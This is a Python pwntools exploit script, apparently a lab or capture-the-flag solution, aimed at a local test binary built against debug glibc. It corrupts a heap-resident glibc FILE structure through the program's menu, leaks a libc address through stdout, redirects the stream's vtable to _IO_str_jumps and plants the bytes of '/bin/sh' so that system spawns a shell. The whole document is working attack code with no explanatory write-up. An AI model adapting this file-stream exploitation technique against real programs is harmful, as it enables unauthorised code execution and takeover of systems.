#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./test', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg/libc.so"}, aslr=False)
r.sendline('1')

# p *(struct _IO_FILE_plus*) 0x5555555594b0
def write_file(data):
    r.sendline('2')
    r.sendlineafter('data> ', data)

def save_file():
    r.sendline('3')

##### overwrite fd to stdout #####
data = b'A'*0x200
data += p64(0) + p64(0x1e1) # heap header
data += p64(0xfbad1800) + p64(0)*3 # read_*
data += p64(0)*3 # write_*
data += p64(0)*2 # buf_*
data += p64(0)*5 # other
data += b'\x01'

write_file(data)
save_file()

##### partial overwrite write_base #####
data = b'A'*0x200
data += p64(0) + p64(0x1e1) # heap header
data += p64(0xfbad1800) + p64(0)*3 # read_*
write_file(data)
save_file()
r.recv(0xc2)

libc = u64(r.recv(8)) - 0x1bdf60
bss = libc + 0x1c4f00
_system = libc + 0x48af0
_IO_str_jumps = libc + 0x1bdd20
info(f"libc: {hex(libc)}")

##### overwrite write_ptr to _IO_str_jump_table #####
data = p64(_system)*(0x200 // 8)
data += p64(0) + p64(0x1e1) # heap header
data += p64(0xfbad1800) + p64(0)*3 # read_*
data += p64(0) + p64(_IO_str_jumps)[:-1]
write_file(data)
save_file()

##### overwrite file vtable to _IO_str_jumps #####
data = b'A'*0x200
data += p64(0) + p64(0x1e1) # head header
data += p64(0x68732f6e69622f)
data += b'A'*0x80 
data += p64(bss)
data += b'\xff'*0x48
data += p64(_IO_str_jumps)
write_file(data)
gdb.attach(r, 'set exec-wrapper env "LD_PRELOAD=/usr/src/glibc/glibc_dbg/libc.so"')
save_file()

r.interactive()

# b _IO_new_file_xsputn
# b _IO_new_file_overflow
